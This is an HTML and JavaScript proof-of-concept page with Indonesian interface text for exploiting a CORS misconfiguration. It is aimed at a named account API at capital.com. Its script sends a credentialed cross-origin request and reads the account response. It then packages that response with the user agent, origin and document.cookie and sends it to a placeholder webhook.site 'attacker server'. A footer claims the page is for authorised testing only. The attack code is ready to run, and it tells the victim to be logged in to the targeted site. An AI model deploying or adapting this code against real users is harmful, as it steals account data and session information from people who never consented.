<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit PoC</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a1a;
            color: #ffffff;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            padding: 30px;
            border-radius: 15px;
            max-width: 700px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0,0,0,0.7);
            border: 1px solid #2a2a4a;
        }
        h1 {
            color: #e94560;
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
        }
        .subtitle {
            color: #8888aa;
            text-align: center;
            font-size: 14px;
            margin-bottom: 25px;
        }
        .status-box {
            background: #0f0f23;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 4px solid #e94560;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            max-height: 300px;
            overflow-y: auto;
            color: #aaccff;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .status-box .success { color: #00ff88; }
        .status-box .error { color: #ff4444; }
        .status-box .warning { color: #ffcc00; }
        .status-box .info { color: #66ccff; }
        .btn {
            background: #e94560;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            font-weight: bold;
            transition: background 0.3s;
        }
        .btn:hover {
            background: #c73652;
        }
        .btn:disabled {
            background: #555;
            cursor: not-allowed;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }
        .badge {
            display: inline-block;
            background: #e9456022;
            color: #e94560;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 11px;
            border: 1px solid #e9456044;
        }
        .counter {
            text-align: center;
            margin: 15px 0;
            font-size: 13px;
            color: #8888aa;
        }
        .loader {
            display: none;
            width: 30px;
            height: 30px;
            border: 3px solid #333;
            border-top: 3px solid #e94560;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        .loader.active { display: block; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .input-group {
            margin: 15px 0;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            color: #8888aa;
            margin-bottom: 5px;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #333;
            background: #0f0f23;
            color: white;
            font-size: 14px;
            font-family: 'Courier New', monospace;
        }
        .input-group input:focus {
            outline: none;
            border-color: #e94560;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>⚡ CORS Exploit PoC</h1>
    <div class="subtitle">
        <span class="badge">CORS Misconfiguration</span>
        <span class="badge" style="margin-left:8px;">Credential Theft</span>
    </div>

    <div class="input-group">
        <label>🎯 Target URL:</label>
        <input type="text" id="targetUrl" value="https://api.mycapital.capital.com/v1/account/">
    </div>

    <div class="counter" id="counter">Status: Siap</div>
    <div class="loader" id="loader"></div>

    <button class="btn" id="attackBtn" onclick="startAttack()">
        🚀 Jalankan Exploit
    </button>

    <div id="logBox" class="status-box">
        <span class="info">[+] Menunggu aksi...</span>
    </div>

    <div class="footer">
        <span>⚠️ Hanya untuk pengujian keamanan yang sah</span><br>
        <span style="font-size:11px;">Proof of Concept - CORS Misconfiguration</span>
    </div>
</div>

<script>
    // ============================================
    // CORS EXPLOIT - PROOF OF CONCEPT
    // ============================================

    const logBox = document.getElementById('logBox');
    const counter = document.getElementById('counter');
    const loader = document.getElementById('loader');
    const attackBtn = document.getElementById('attackBtn');
    const targetUrlInput = document.getElementById('targetUrl');

    let isRunning = false;

    function log(message, type = 'info') {
        const types = {
            success: 'success',
            error: 'error',
            warning: 'warning',
            info: 'info'
        };
        const cls = types[type] || 'info';
        const timestamp = new Date().toLocaleTimeString();
        const entry = document.createElement('div');
        entry.innerHTML = `<span class="${cls}">[${timestamp}] ${message}</span>`;
        logBox.appendChild(entry);
        logBox.scrollTop = logBox.scrollHeight;
    }

    function updateStatus(text, loading = false) {
        counter.textContent = text;
        if (loading) {
            loader.classList.add('active');
            attackBtn.disabled = true;
        } else {
            loader.classList.remove('active');
            attackBtn.disabled = false;
        }
    }

    // ============================================
    // FUNGSI EKSPLOIT UTAMA
    // ============================================
    async function startAttack() {
        if (isRunning) return;
        isRunning = true;

        // Bersihkan log
        logBox.innerHTML = '';
        log('🔄 Memulai exploit...', 'info');

        const targetUrl = targetUrlInput.value.trim();
        if (!targetUrl) {
            log('❌ Target URL tidak boleh kosong!', 'error');
            isRunning = false;
            return;
        }

        updateStatus('⏳ Mengirim request...', true);

        try {
            log(`📡 Target: ${targetUrl}`, 'info');
            log(`🔑 Mode: credentials: 'include' (mengirim cookie)`, 'info');

            // ============================================
            // KIRIM REQUEST DENGAN CREDENTIALS
            // ============================================
            const response = await fetch(targetUrl, {
                method: 'GET',
                credentials: 'include', // <-- OTOMATIS KIRIM COOKIE
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json'
                }
            });

            const status = response.status;
            const statusText = response.statusText;

            log(`📊 Status: ${status} ${statusText}`, 
                status === 200 ? 'success' : 'warning');

            // ============================================
            // BACA RESPONS (Karena CORS longgar)
            // ============================================
            const contentType = response.headers.get('content-type') || '';
            let data = '';

            if (contentType.includes('application/json')) {
                const jsonData = await response.json();
                data = JSON.stringify(jsonData, null, 2);
            } else {
                data = await response.text();
            }

            log(`📦 Data yang diterima:`, 'info');
            log(data.length > 500 ? data.substring(0, 500) + '...' : data, 'info');

            // ============================================
            // CEK: Apakah ada pesan error?
            // ============================================
            let isVulnerable = false;
            try {
                const parsed = JSON.parse(data);
                if (parsed.message && parsed.message.includes('Missing Authentication Token')) {
                    isVulnerable = true;
                    log('', 'info');
                    log('✅ INI BUKTI KERENTANAN!', 'success');
                    log('🔸 Request berhasil dikirim dengan CREDENTIALS', 'success');
                    log('🔸 Browser mengizinkan akses lintas-domain', 'success');
                    log('🔸 Respons dari API berhasil DIBACA', 'success');
                    log('', 'info');
                    log('⚠️ Meskipun status 403, ini membuktikan:', 'warning');
                    log('   1. CORS mengizinkan evil.com mengakses API', 'warning');
                    log('   2. Credentials (cookie) dikirim otomatis', 'warning');
                    log('   3. JavaScript bisa membaca respons API', 'warning');
                    log('', 'info');
                    log('💥 Jika user SUDAH LOGIN, data sensitif BISA DICURI!', 'error');
                }
            } catch (e) {
                // Not JSON, tetap lanjut
            }

            // ============================================
            // EKSFILTRASI (Kirim data ke server penyerang)
            // ============================================
            const exfilPayload = {
                timestamp: new Date().toISOString(),
                target: targetUrl,
                status: status,
                data: data,
                userAgent: navigator.userAgent,
                origin: window.location.origin,
                cookie: document.cookie || 'HttpOnly cookie (tidak bisa dibaca JS)'
            };

            // Kirim ke server penyerang (ganti dengan domain Anda)
            const EXFIL_SERVER = 'https://webhook.site/your-id-here'; // <-- GANTI!
            
            log('📤 Mencoba mengirim data ke server penyerang...', 'info');
            
            try {
                // Use sendBeacon for reliable sending
                if (navigator.sendBeacon) {
                    const blob = new Blob([JSON.stringify(exfilPayload)], {
                        type: 'application/json'
                    });
                    navigator.sendBeacon(EXFIL_SERVER, blob);
                    log('✅ Data dikirim via sendBeacon', 'success');
                } else {
                    await fetch(EXFIL_SERVER, {
                        method: 'POST',
                        mode: 'no-cors',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(exfilPayload)
                    });
                    log('✅ Data dikirim via fetch', 'success');
                }
            } catch (exfilError) {
                log(`⚠️ Gagal kirim data: ${exfilError.message}`, 'warning');
                log('💡 Tapi ini sudah cukup bukti!', 'info');
            }

            log('', 'info');
            log('✅ EXPLOIT SELESAI!', 'success');
            log('📋 Bukti kerentanan CORS Misconfiguration terkonfirmasi!', 'success');

            updateStatus('✅ Selesai - CORS Vulnerable!', false);

        } catch (error) {
            log(`❌ Error: ${error.message}`, 'error');
            log('⚠️ Kemungkinan CORS memblokir request ini', 'warning');
            log('💡 Atau URL target tidak valid', 'info');
            
            // Cek apakah error karena CORS
            if (error.message.includes('Failed to fetch')) {
                log('', 'info');
                log('🔍 CORS mungkin AMAN - request diblokir browser', 'info');
            }
            
            updateStatus('❌ Gagal', false);
        }

        isRunning = false;
    }

    // ============================================
    // AUTO-RUN SETELAH PAGE LOAD
    // ============================================
    window.onload = function() {
        log('🟢 Halaman PoC siap', 'info');
        log('💡 Klik tombol untuk menjalankan exploit', 'info');
        log('📌 Pastikan Anda sudah login ke capital.com', 'info');
        log('🔗 Ubah target URL jika perlu', 'info');
    };
</script>

</body>
</html>
